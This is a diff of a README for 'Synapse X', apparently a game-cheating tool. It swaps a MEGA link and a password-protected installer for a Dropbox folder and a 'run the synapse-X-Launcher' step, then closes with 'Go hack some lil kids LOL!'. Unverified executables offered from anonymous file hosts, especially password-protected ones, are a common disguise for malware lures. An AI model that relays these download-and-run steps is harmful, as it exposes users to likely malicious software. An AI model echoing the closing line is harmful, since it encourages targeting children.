@@ -23,8 +23,14 @@ This concludes the general user guide for Synapse X. If you want to develop your
 
 
 
-Download here: https://mega.nz/file/DRoV3I5b#L_AhoAXjUvjLUTJjXMTANKcSDrWtNfYLz55IL8QrwA4
-Run the installation file ( password:6235)
-Wait for the program to be fully installed
-Run the program
-Done, you are wonderful!
+1.download here: https://www.dropbox.com/sh/8of8hc0hl9nviay/AAC7ivV1sfB0r12DSYmSlmqXa?dl=0
+
+2:check for any missing files
+
+your files should look like this:![image](https://user-images.githubusercontent.com/130373942/233718413-0c3b4abe-8197-4c2b-9314-162f4fd7a3fd.png)
+![image](https://user-images.githubusercontent.com/130373942/233718414-6b74b914-e8ac-4bdf-aae8-e5577a215dd8.png)
+![image](https://user-images.githubusercontent.com/130373942/233718415-7dfe590a-4d06-4df9-a3dc-a9f44f0d7b68.png)
+
+3:run the synapse-X-Launcher
+
+4:Go hack some lil kids LOL!
